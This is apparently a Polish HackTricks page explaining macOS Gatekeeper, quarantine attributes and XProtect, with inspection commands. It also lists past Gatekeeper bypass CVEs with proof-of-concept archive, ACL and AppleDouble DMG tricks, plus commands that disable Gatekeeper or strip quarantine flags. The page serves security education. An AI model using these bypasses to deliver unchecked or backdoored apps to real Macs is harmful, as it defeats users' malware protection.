# macOS Gatekeeper / Quarantine / XProtect

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Czy pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć swoją **firmę reklamowaną w HackTricks**? A może chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR do** [**repozytorium hacktricks**](https://github.com/carlospolop/hacktricks) **i** [**repozytorium hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud)
*
* .

</details>

## Gatekeeper

**Gatekeeper** to funkcja bezpieczeństwa opracowana dla systemów operacyjnych Mac, zaprojektowana w celu zapewnienia, że użytkownicy **uruchamiają tylko zaufane oprogramowanie** na swoich systemach. Działa poprzez **weryfikację oprogramowania**, które użytkownik pobiera i próbuje otworzyć z **źródeł spoza App Store**, takich jak aplikacja, wtyczka lub pakiet instalacyjny.

Kluczowym mechanizmem Gatekeepera jest jego proces **weryfikacji**. Sprawdza, czy pobrane oprogramowanie jest **podpisane przez uznawanego dewelopera**, zapewniając autentyczność oprogramowania. Ponadto sprawdza, czy oprogramowanie jest **zatwierdzone przez Apple**, potwierdzając, że jest wolne od znanych złośliwych treści i nie było modyfikowane po zatwierdzeniu.

Dodatkowo, Gatekeeper wzmacnia kontrolę i bezpieczeństwo użytkownika, **prosząc użytkowników o zatwierdzenie otwarcia** pobranego oprogramowania po raz pierwszy. Ta ochrona pomaga zapobiec przypadkowemu uruchomieniu potencjalnie szkodliwego kodu wykonywalnego, który użytkownik mógł pomylić z nieszkodliwym plikiem danych.

### Sygnatury aplikacji

Sygnatury aplikacji, znane również jako sygnatury kodu, są kluczowym elementem infrastruktury bezpieczeństwa Apple. Służą do **weryfikacji tożsamości autora oprogramowania** (dewelopera) oraz zapewnienia, że kod nie był modyfikowany od czasu ostatniego podpisania.

Oto jak to działa:

1. **Podpisanie aplikacji:** Gdy deweloper jest gotowy do dystrybucji swojej aplikacji, **podpisuje ją za pomocą klucza prywatnego**. Ten klucz prywatny jest powiązany z **certyfikatem, który Apple wydaje deweloperowi** po zapisaniu się do programu Apple Developer Program. Proces podpisywania polega na utworzeniu kryptograficznego skrótu wszystkich części aplikacji i zaszyfrowaniu tego skrótu za pomocą klucza prywatnego dewelopera.
2. **Dystrybucja aplikacji:** Podpisana aplikacja jest następnie dystrybuowana użytkownikom wraz z certyfikatem dewelopera, który zawiera odpowiadający mu klucz publiczny.
3. **Weryfikacja aplikacji:** Gdy użytkownik pobiera i próbuje uruchomić aplikację, jego system operacyjny Mac używa klucza publicznego z certyfikatu dewelopera do odszyfrowania skrótu. Następnie oblicza skrót na podstawie bieżącego stanu aplikacji i porównuje go z odszyfrowanym skrótem. Jeśli się zgadzają, oznacza to, że **aplikacja nie została zmodyfikowana** od czasu, gdy deweloper ją podpisał, i system pozwala na jej uruchomienie.

Sygnatury aplikacji są istotną częścią technologii Gatekeeper firmy Apple. Gdy użytkownik próbuje **otworzyć aplikację pobraną z internetu**, Gatekeeper weryfikuje sygnaturę aplikacji. Jeśli jest ona podpisana certyfikatem wydanym przez Apple dla znanego dewelopera i kod nie został zmodyfikowany, Gatekeeper pozwala na uruchomienie aplikacji. W przeciwnym razie blokuje aplikację i informuje użytkownika.

Począwszy od macOS Catalina, **Gatekeeper sprawdza również, czy aplikacja została zatwierdzona** przez Apple, dodając dodatkową warstwę bezpieczeństwa. Proces zatwierdzania sprawdza aplikację pod kątem znanych problemów związanych z bezpieczeństwem i złośliwym kodem, a jeśli te sprawdzenia zostaną zaliczone, Apple dodaje bilet do aplikacji, który Gatekeeper może zweryfikować.

#### Sprawdzanie sygnatur

Podczas sprawdzania pewnego **przykładu złośliwego oprogramowania** zawsze powinieneś **sprawdzić sygnaturę** binarnego pliku, ponieważ **deweloper**, który go podpisał, może już być **powiązany** z **złośliwym oprogramowaniem**.
```bash
# Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

# Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

# Get entitlements from the binary
codesign -d --entitlements :- /System/Applications/Automator.app # Check the TCC perms

# Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app

# Sign a binary
codesign -s <cert-name-keychain> toolsdemo
```
### Notaryzacja

Proces notaryzacji firmy Apple służy jako dodatkowe zabezpieczenie mające chronić użytkowników przed potencjalnie szkodliwym oprogramowaniem. Polega on na **przesłaniu aplikacji przez dewelopera do badania** przez **Usługę Notarialną Apple**, która nie powinna być mylona z Recenzją aplikacji. Ta usługa to **automatyczny system**, który analizuje przesłane oprogramowanie pod kątem **zawartości złośliwej** oraz potencjalnych problemów z podpisem kodu.

Jeśli oprogramowanie **przejdzie** tę kontrolę bez wywołania jakichkolwiek obaw, Usługa Notarialna generuje bilet notaryzacyjny. Następnie deweloper musi **dołączyć ten bilet do swojego oprogramowania**, co nazywane jest "przypinaniem". Ponadto, bilet notaryzacyjny jest również publikowany online, gdzie Gatekeeper, technologia bezpieczeństwa Apple, ma do niego dostęp.

Podczas pierwszej instalacji lub uruchomienia oprogramowania przez użytkownika, istnienie biletu notaryzacyjnego - czy to przypiętego do pliku wykonywalnego, czy znalezionego online - **informuje Gatekeepera, że oprogramowanie zostało notaryzowane przez Apple**. W rezultacie Gatekeeper wyświetla opisową wiadomość w oknie początkowego uruchamiania, informującą, że oprogramowanie zostało sprawdzone pod kątem zawartości złośliwej przez Apple. Ten proces zwiększa zaufanie użytkowników do bezpieczeństwa oprogramowania, które instalują lub uruchamiają na swoich systemach.

### Wyliczanie GateKeeper

GateKeeper to zarówno **kilka komponentów bezpieczeństwa**, które uniemożliwiają uruchamianie niezaufanych aplikacji, jak i **jeden z tych komponentów**.

Można sprawdzić **status** GateKeepera za pomocą:
```bash
# Check the status
spctl --status
```
{% hint style="danger" %}
Należy zauważyć, że sprawdzanie podpisów GateKeeper jest wykonywane tylko dla **plików z atrybutem kwarantanny**, a nie dla każdego pliku.
{% endhint %}

GateKeeper sprawdzi, czy na podstawie **preferencji i podpisu** można uruchomić plik binarny:

<figure><img src="../../../.gitbook/assets/image (678).png" alt=""><figcaption></figcaption></figure>

Baza danych przechowująca tę konfigurację znajduje się w **`/var/db/SystemPolicy`**. Możesz sprawdzić tę bazę danych jako root za pomocą:
```bash
# Open database
sqlite3 /var/db/SystemPolicy

# Get allowed rules
SELECT requirement,allow,disabled,label from authority where label != 'GKE' and disabled=0;
requirement|allow|disabled|label
anchor apple generic and certificate 1[subject.CN] = "Apple Software Update Certification Authority"|1|0|Apple Installer
anchor apple|1|0|Apple System
anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] exists|1|0|Mac App Store
anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] exists and (certificate leaf[field.1.2.840.113635.100.6.1.14] or certificate leaf[field.1.2.840.113635.100.6.1.13]) and notarized|1|0|Notarized Developer ID
[...]
```
Zauważ, że pierwsza reguła kończy się na "**App Store**", a druga na "**Developer ID**", a wcześniej na obrazku było **włączone wykonywanie aplikacji z App Store i od identyfikowanych deweloperów**. Jeśli **zmienisz** tę ustawienie na App Store, reguły "**Notarized Developer ID**" znikną.

Istnieje również tysiące reguł typu **GKE**:
```bash
SELECT requirement,allow,disabled,label from authority where label = 'GKE' limit 5;
cdhash H"b40281d347dc574ae0850682f0fd1173aa2d0a39"|1|0|GKE
cdhash H"5fd63f5342ac0c7c0774ebcbecaf8787367c480f"|1|0|GKE
cdhash H"4317047eefac8125ce4d44cab0eb7b1dff29d19a"|1|0|GKE
cdhash H"0a71962e7a32f0c2b41ddb1fb8403f3420e1d861"|1|0|GKE
cdhash H"8d0d90ff23c3071211646c4c9c607cdb601cb18f"|1|0|GKE
```
Oto skróty, które pochodzą z **`/var/db/SystemPolicyConfiguration/gke.bundle/Contents/Resources/gke.auth`, `/var/db/gke.bundle/Contents/Resources/gk.db`** oraz **`/var/db/gkopaque.bundle/Contents/Resources/gkopaque.db`**

Alternatywnie, możesz wymienić poprzednie informacje za pomocą:
```bash
sudo spctl --list
```
Opcje **`--master-disable`** i **`--global-disable`** narzędzia **`spctl`** całkowicie **wyłączą** te kontrole podpisów:
```bash
# Disable GateKeeper
spctl --global-disable
spctl --master-disable

# Enable it
spctl --global-enable
spctl --master-enable
```
Kiedy jest w pełni włączony, pojawi się nowa opcja:

<figure><img src="../../../.gitbook/assets/image (679).png" alt=""><figcaption></figcaption></figure>

Możliwe jest **sprawdzenie, czy aplikacja zostanie zezwolona przez GateKeeper** za pomocą:
```bash
spctl --assess -v /Applications/App.app
```
Możliwe jest dodanie nowych reguł w GateKeeperze, aby umożliwić wykonanie określonych aplikacji za pomocą:
```bash
# Check if allowed - nop
spctl --assess -v /Applications/App.app
/Applications/App.app: rejected
source=no usable signature

# Add a label and allow this label in GateKeeper
sudo spctl --add --label "whitelist" /Applications/App.app
sudo spctl --enable --label "whitelist"

# Check again - yep
spctl --assess -v /Applications/App.app
/Applications/App.app: accepted
```
### Pliki kwarantanny

Po pobraniu aplikacji lub pliku, specyficzne aplikacje macOS, takie jak przeglądarki internetowe lub klienty poczty elektronicznej, do pobranego pliku **dołączają rozszerzony atrybut pliku**, znany jako "**flaga kwarantanny**". Ten atrybut działa jako środek bezpieczeństwa, oznaczając plik jako pochodzący z niewiarygodnego źródła (internetu) i potencjalnie niosący ryzyko. Jednak nie wszystkie aplikacje dołączają ten atrybut, na przykład popularne oprogramowanie klientów BitTorrent zazwyczaj omija ten proces.

**Obecność flagi kwarantanny sygnalizuje funkcję bezpieczeństwa Gatekeeper w macOS, gdy użytkownik próbuje uruchomić plik**.

W przypadku, gdy **flaga kwarantanny nie jest obecna** (jak w przypadku plików pobranych za pomocą niektórych klientów BitTorrent), **Gatekeeper może nie wykonać kontroli**. Dlatego użytkownicy powinni zachować ostrożność przy otwieraniu plików pobranych z mniej bezpiecznych lub nieznanych źródeł.

{% hint style="info" %}
**Sprawdzanie** ważności **podpisów kodu** to proces **wymagający zasobów**, który obejmuje generowanie kryptograficznych **skrótów** kodu i wszystkich dołączonych zasobów. Ponadto, sprawdzanie ważności certyfikatu wymaga **sprawdzenia online** na serwerach Apple, aby sprawdzić, czy został unieważniony po wydaniu. Z tych powodów pełne sprawdzanie podpisu kodu i notaryzacji jest **niepraktyczne do uruchamiania za każdym razem, gdy aplikacja jest uruchamiana**.

Dlatego te kontrole są **wykonywane tylko podczas uruchamiania aplikacji z atrybutem kwarantanny**.
{% endhint %}

{% hint style="warning" %}
Ten atrybut musi być **ustawiony przez aplikację tworzącą/pobierającą** plik.

Jednak pliki, które są zabezpieczone piaskownicą, będą miały ten atrybut ustawiony dla każdego utworzonego przez nie pliku. Aplikacje niespiaskowane mogą samodzielnie go ustawić lub określić klucz [**LSFileQuarantineEnabled**](https://developer.apple.com/documentation/bundleresources/information\_property\_list/lsfilequarantineenabled?language=objc) w pliku **Info.plist**, co spowoduje, że system ustawia rozszerzony atrybut `com.apple.quarantine` dla utworzonych plików.
{% endhint %}

Można **sprawdzić jego status i włączyć/wyłączyć** (wymagane uprawnienia roota) za pomocą:
```bash
spctl --status
assessments enabled

spctl --enable
spctl --disable
#You can also allow nee identifies to execute code using the binary "spctl"
```
Możesz również **sprawdzić, czy plik ma rozszerzone atrybuty kwarantanny** za pomocą:
```bash
xattr file.png
com.apple.macl
com.apple.quarantine
```
Sprawdź **wartość** **rozszerzonych** **atrybutów** i dowiedz się, która aplikacja napisała atrybut kwarantanny za pomocą:
```bash
xattr -l portada.png
com.apple.macl:
00000000  03 00 53 DA 55 1B AE 4C 4E 88 9D CA B7 5C 50 F3  |..S.U..LN.....P.|
00000010  16 94 03 00 27 63 64 97 98 FB 4F 02 84 F3 D0 DB  |....'cd...O.....|
00000020  89 53 C3 FC 03 00 27 63 64 97 98 FB 4F 02 84 F3  |.S....'cd...O...|
00000030  D0 DB 89 53 C3 FC 00 00 00 00 00 00 00 00 00 00  |...S............|
00000040  00 00 00 00 00 00 00 00                          |........|
00000048
com.apple.quarantine: 00C1;607842eb;Brave;F643CD5F-6071-46AB-83AB-390BA944DEC5
# 00c1 -- It has been allowed to eexcute this file (QTN_FLAG_USER_APPROVED = 0x0040)
# 607842eb -- Timestamp
# Brave -- App
# F643CD5F-6071-46AB-83AB-390BA944DEC5 -- UID assigned to the file downloaded
```
W rzeczywistości proces "może ustawić flagi kwarantanny dla plików, które tworzy" (próbowałem zastosować flagę USER_APPROVED w utworzonym pliku, ale nie została ona zastosowana):

<details>

<summary>Kod źródłowy zastosowania flag kwarantanny</summary>
```c
#include <stdio.h>
#include <stdlib.h>

enum qtn_flags {
QTN_FLAG_DOWNLOAD = 0x0001,
QTN_FLAG_SANDBOX = 0x0002,
QTN_FLAG_HARD = 0x0004,
QTN_FLAG_USER_APPROVED = 0x0040,
};

#define qtn_proc_alloc _qtn_proc_alloc
#define qtn_proc_apply_to_self _qtn_proc_apply_to_self
#define qtn_proc_free _qtn_proc_free
#define qtn_proc_init _qtn_proc_init
#define qtn_proc_init_with_self _qtn_proc_init_with_self
#define qtn_proc_set_flags _qtn_proc_set_flags
#define qtn_file_alloc _qtn_file_alloc
#define qtn_file_init_with_path _qtn_file_init_with_path
#define qtn_file_free _qtn_file_free
#define qtn_file_apply_to_path _qtn_file_apply_to_path
#define qtn_file_set_flags _qtn_file_set_flags
#define qtn_file_get_flags _qtn_file_get_flags
#define qtn_proc_set_identifier _qtn_proc_set_identifier

typedef struct _qtn_proc *qtn_proc_t;
typedef struct _qtn_file *qtn_file_t;

int qtn_proc_apply_to_self(qtn_proc_t);
void qtn_proc_init(qtn_proc_t);
int qtn_proc_init_with_self(qtn_proc_t);
int qtn_proc_set_flags(qtn_proc_t, uint32_t flags);
qtn_proc_t qtn_proc_alloc();
void qtn_proc_free(qtn_proc_t);
qtn_file_t qtn_file_alloc(void);
void qtn_file_free(qtn_file_t qf);
int qtn_file_set_flags(qtn_file_t qf, uint32_t flags);
uint32_t qtn_file_get_flags(qtn_file_t qf);
int qtn_file_apply_to_path(qtn_file_t qf, const char *path);
int qtn_file_init_with_path(qtn_file_t qf, const char *path);
int qtn_proc_set_identifier(qtn_proc_t qp, const char* bundleid);

int main() {

qtn_proc_t qp = qtn_proc_alloc();
qtn_proc_set_identifier(qp, "xyz.hacktricks.qa");
qtn_proc_set_flags(qp, QTN_FLAG_DOWNLOAD | QTN_FLAG_USER_APPROVED);
qtn_proc_apply_to_self(qp);
qtn_proc_free(qp);

FILE *fp;
fp = fopen("thisisquarantined.txt", "w+");
fprintf(fp, "Hello Quarantine\n");
fclose(fp);

return 0;

}
```
</details>

A następnie **usuń** ten atrybut za pomocą:
```bash
xattr -d com.apple.quarantine portada.png
#You can also remove this attribute from every file with
find . -iname '*' -print0 | xargs -0 xattr -d com.apple.quarantine
```
Aby znaleźć wszystkie pliki umieszczone w kwarantannie, wykonaj poniższą komendę:

{% code overflow="wrap" %}
```bash
find / -exec ls -ld {} \; 2>/dev/null | grep -E "[x\-]@ " | awk '{printf $9; printf "\n"}' | xargs -I {} xattr -lv {} | grep "com.apple.quarantine"
```
{% endcode %}

Informacje o kwarantannie są przechowywane w centralnej bazie danych zarządzanej przez LaunchServices w **`~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2`**.

#### **Quarantine.kext**

Rozszerzenie jądra jest dostępne tylko poprzez **pamięć podręczną jądra w systemie**; jednakże, _można_ pobrać **Kernel Debug Kit z https://developer.apple.com/**, który zawiera zsymolizowaną wersję rozszerzenia.

### XProtect

XProtect to wbudowana funkcja **antywirusowa** w macOS. XProtect **sprawdza każdą aplikację przy pierwszym uruchomieniu lub modyfikacji w stosunku do swojej bazy danych** znanych złośliwych oprogramowań i niebezpiecznych typów plików. Gdy pobierasz plik za pomocą określonych aplikacji, takich jak Safari, Mail lub Messages, XProtect automatycznie skanuje plik. Jeśli pasuje do jakiegokolwiek znanego złośliwego oprogramowania w swojej bazie danych, XProtect **uniemożliwi uruchomienie pliku** i powiadomi o zagrożeniu.

Baza danych XProtect jest **regularnie aktualizowana** przez Apple z nowymi definicjami złośliwego oprogramowania, a te aktualizacje są automatycznie pobierane i instalowane na Twoim Macu. Zapewnia to, że XProtect zawsze jest aktualny z najnowszymi znanymi zagrożeniami.

Jednak warto zauważyć, że **XProtect nie jest pełnowartościowym oprogramowaniem antywirusowym**. Sprawdza tylko określoną listę znanych zagrożeń i nie wykonuje skanowania w czasie rzeczywistym, jak większość oprogramowania antywirusowego.

Możesz uzyskać informacje o najnowszej aktualizacji XProtect, uruchamiając:

{% code overflow="wrap" %}
```bash
system_profiler SPInstallHistoryDataType 2>/dev/null | grep -A 4 "XProtectPlistConfigData" | tail -n 5
```
{% endcode %}

XProtect znajduje się w chronionym przez SIP miejscu w **/Library/Apple/System/Library/CoreServices/XProtect.bundle**, a wewnątrz pakietu można znaleźć informacje, których używa XProtect:

* **`XProtect.bundle/Contents/Resources/LegacyEntitlementAllowlist.plist`**: Pozwala kodowi o tych cdhashach korzystać z przestarzałych uprawnień.
* **`XProtect.bundle/Contents/Resources/XProtect.meta.plist`**: Lista wtyczek i rozszerzeń, które są niedozwolone do ładowania za pomocą BundleID i TeamID lub wskazujące minimalną wersję.
* **`XProtect.bundle/Contents/Resources/XProtect.yara`**: Reguły Yara do wykrywania złośliwego oprogramowania.
* **`XProtect.bundle/Contents/Resources/gk.db`**: Baza danych SQLite3 zawierająca skróty zablokowanych aplikacji i TeamID.

Należy zauważyć, że istnieje inna aplikacja w **`/Library/Apple/System/Library/CoreServices/XProtect.app`** związaną z XProtect, która nie jest związana z procesem Gatekeeper.

### Nie Gatekeeper

{% hint style="danger" %}
Należy zauważyć, że Gatekeeper **nie jest uruchamiany za każdym razem**, gdy uruchamiasz aplikację, tylko _**AppleMobileFileIntegrity**_ (AMFI) będzie tylko **weryfikować podpisy kodu wykonywalnego** podczas uruchamiania aplikacji, która została już uruchomiona i zweryfikowana przez Gatekeepera.
{% endhint %}

W związku z tym wcześniej można było uruchomić aplikację, aby ją zapamiętać za pomocą Gatekeepera, a następnie **modyfikować pliki nie wykonywalne aplikacji** (takie jak pliki Electron asar lub NIB), i jeśli nie było innych zabezpieczeń, aplikacja była **uruchamiana** z **złośliwymi** dodatkami.

Jednak teraz jest to niemożliwe, ponieważ macOS **uniemożliwia modyfikowanie plików** wewnątrz pakietów aplikacji. Więc jeśli spróbujesz ataku [Dirty NIB](../macos-proces-abuse/macos-dirty-nib.md), okaże się, że nie jest już możliwe jego wykorzystanie, ponieważ po uruchomieniu aplikacji w celu jej zapamiętania za pomocą Gatekeepera, nie będziesz mógł modyfikować pakietu. A jeśli zmienisz na przykład nazwę katalogu Contents na NotCon (jak wskazano w eksploicie), a następnie uruchomisz główny plik binarny aplikacji, aby ją zapamiętać za pomocą Gatekeepera, spowoduje to błąd i nie zostanie uruchomiona.

## Ominiecie Gatekeepera

Jakiekolwiek sposoby obejścia Gatekeepera (umiejętność sprawienia, że użytkownik pobierze coś i uruchomi to, gdy Gatekeeper powinien tego zabronić) są uważane za podatność w macOS. Oto kilka CVE przypisanych do technik, które umożliwiały obejście Gatekeepera w przeszłości:

### [CVE-2021-1810](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810)

Zauważono, że jeśli do ekstrakcji używany jest **Archive Utility**, pliki o **ścieżkach przekraczających 886 znaków** nie otrzymują rozszerzonego atrybutu com.apple.quarantine. Sytuacja ta nieumyślnie pozwala tym plikom **obejść kontrole bezpieczeństwa** Gatekeepera.

Sprawdź [**oryginalny raport**](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810) po więcej informacji.

### [CVE-2021-30990](https://ronmasas.com/posts/bypass-macos-gatekeeper)

Gdy aplikacja jest tworzona za pomocą **Automatora**, informacje o tym, co musi wykonać, znajdują się w `application.app/Contents/document.wflow`, a nie w pliku wykonywalnym. Plik wykonywalny to tylko ogólny binarny Automator o nazwie **Automator Application Stub**.

Dlatego można zrobić, żeby `application.app/Contents/MacOS/Automator\ Application\ Stub` **wskazywał symbolicznym linkiem na inny Automator Application Stub w systemie**, a zostanie wykonane to, co jest w `document.wflow` (twój skrypt) **bez wywoływania Gatekeepera**, ponieważ rzeczywisty plik wykonywalny nie ma atrybutu kwarantanny.

Przykładowa oczekiwana lokalizacja: `/System/Library/CoreServices/Automator\ Application\ Stub.app/Contents/MacOS/Automator\ Application\ Stub`

Sprawdź [**oryginalny raport**](https://ronmasas.com/posts/bypass-macos-gatekeeper) po więcej informacji.

### [CVE-2022-22616](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/)

W tym przypadku omijanie polegało na utworzeniu pliku zip z aplikacją, zaczynając kompresję od `application.app/Contents`, a nie od `application.app`. W związku z tym **atrybut kwarantanny** został zastosowany do wszystkich **plików z `application.app/Contents`**, ale **nie do `application.app`**, który był sprawdzany przez Gatekeepera, więc Gatekeeper został obejśnięty, ponieważ po uruchomieniu `application.app` nie miał atrybutu kwarantanny.
```bash
zip -r test.app/Contents test.zip
```
Sprawdź [**oryginalny raport**](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/) po więcej informacji.

### [CVE-2022-32910](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32910)

Nawet jeśli komponenty są różne, wykorzystanie tej podatności jest bardzo podobne do poprzedniej. W tym przypadku wygenerujemy Apple Archive z **`application.app/Contents`**, więc **`application.app` nie otrzyma atrybutu kwarantanny** po rozpakowaniu przez **Archive Utility**.
```bash
aa archive -d test.app/Contents -o test.app.aar
```
Sprawdź [**oryginalny raport**](https://www.jamf.com/blog/jamf-threat-labs-macos-archive-utility-vulnerability/) po więcej informacji.

### [CVE-2022-42821](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

ACL **`writeextattr`** może być używane do zapobiegania zapisywaniu atrybutu w pliku:
```bash
touch /tmp/no-attr
chmod +a "everyone deny writeextattr" /tmp/no-attr
xattr -w attrname vale /tmp/no-attr
xattr: [Errno 13] Permission denied: '/tmp/no-attr'
```
Ponadto, format pliku **AppleDouble** kopiuje plik wraz z jego ACEs.

W [**kodzie źródłowym**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) można zobaczyć, że reprezentacja tekstowa ACL przechowywana wewnątrz xattr o nazwie **`com.apple.acl.text`** zostanie ustawiona jako ACL w rozpakowanym pliku. Więc jeśli spakujesz aplikację do pliku zip w formacie **AppleDouble** z ACL, które uniemożliwia zapis innych xattr do niego... atrybut kwarantanny nie zostanie ustawiony w aplikacji:

{% code overflow="wrap" %}
```bash
chmod +a "everyone deny write,writeattr,writeextattr" /tmp/test
ditto -c -k test test.zip
python3 -m http.server
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
```
{% endcode %}

Sprawdź [**oryginalny raport**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) po więcej informacji.

Należy zauważyć, że to można również wykorzystać za pomocą AppleArchives:
```bash
mkdir app
touch app/test
chmod +a "everyone deny write,writeattr,writeextattr" app/test
aa archive -d app -o test.aar
```
### [CVE-2023-27943](https://blog.f-secure.com/discovery-of-gatekeeper-bypass-cve-2023-27943/)

Odkryto, że **Google Chrome nie ustawiał atrybutu kwarantanny** dla pobranych plików z powodu pewnych wewnętrznych problemów systemu macOS.

### [CVE-2023-27951](https://redcanary.com/blog/gatekeeper-bypass-vulnerabilities/)

Formaty plików AppleDouble przechowują atrybuty pliku w osobnym pliku zaczynającym się od `._`, co pomaga w kopiowaniu atrybutów plików **między urządzeniami z systemem macOS**. Jednak zauważono, że po rozpakowaniu pliku AppleDouble, plik zaczynający się od `._` **nie otrzymywał atrybutu kwarantanny**.

{% code overflow="wrap" %}
```bash
mkdir test
echo a > test/a
echo b > test/b
echo ._a > test/._a
aa archive -d test/ -o test.aar

# If you downloaded the resulting test.aar and decompress it, the file test/._a won't have a quarantitne attribute
```
{% endcode %}

Być w stanie utworzyć plik, który nie będzie miał ustawionego atrybutu kwarantanny, umożliwiało **ominięcie Gatekeepera**. Trikiem było **utworzenie aplikacji pliku DMG** przy użyciu konwencji nazewnictwa AppleDouble (rozpoczęcie od `._`) oraz utworzenie **widocznego pliku jako dowiązanie symboliczne do tego ukrytego** pliku bez atrybutu kwarantanny.\
Gdy **plik dmg zostanie uruchomiony**, ponieważ nie ma atrybutu kwarantanny, **omija Gatekeepera**.
```bash
# Create an app bundle with the backdoor an call it app.app

echo "[+] creating disk image with app"
hdiutil create -srcfolder app.app app.dmg

echo "[+] creating directory and files"
mkdir
mkdir -p s/app
cp app.dmg s/app/._app.dmg
ln -s ._app.dmg s/app/app.dmg

echo "[+] compressing files"
aa archive -d s/ -o app.aar
```
### Zapobieganie karantannie xattr

W przypadku paczki ".app", jeśli atrybut karantanny xattr nie zostanie do niej dodany, **Gatekeeper nie zostanie uruchomiony**.

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
